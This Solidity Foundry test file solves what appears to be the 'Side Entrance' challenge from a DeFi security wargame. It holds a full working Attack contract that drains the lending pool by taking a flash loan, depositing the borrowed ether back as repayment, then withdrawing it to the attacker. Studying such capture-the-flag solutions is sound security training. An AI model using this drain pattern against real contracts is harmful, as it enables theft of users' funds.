// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceLenderTest is Test {
    address public deployer;
    address public player;

    SideEntranceLenderPool public pool;

    uint256 public constant ETHER_IN_POOL = 1_000 ether;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");

        vm.startPrank(deployer);

        pool = new SideEntranceLenderPool();
        vm.deal(address(pool), ETHER_IN_POOL);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        assertEq(address(pool).balance, ETHER_IN_POOL);
        emit log_named_decimal_uint("pool balance", address(pool).balance, 18);
        assertEq(address(pool).balance, ETHER_IN_POOL);
        emit log_named_decimal_uint("player balance", address(player).balance, 18);

        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);
        Attack attack = new Attack(payable(address(pool)));
        attack.attack(ETHER_IN_POOL);
        attack.withdraw();

        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();
        assertEq(address(pool).balance, 0);
        assertGt(address(player).balance, ETHER_IN_POOL);
        emit log_named_decimal_uint("pool balance", address(pool).balance, 18);
        emit log_named_decimal_uint("player balance", address(player).balance, 18);
    }
}

contract Attack {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address payable _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 _amount) external payable {
        pool.flashLoan(_amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
    }

    receive() external payable {
        (bool success,) = address(owner).call{value: address(this).balance}("");
        require(success, "failed to withdraw");
    }
}
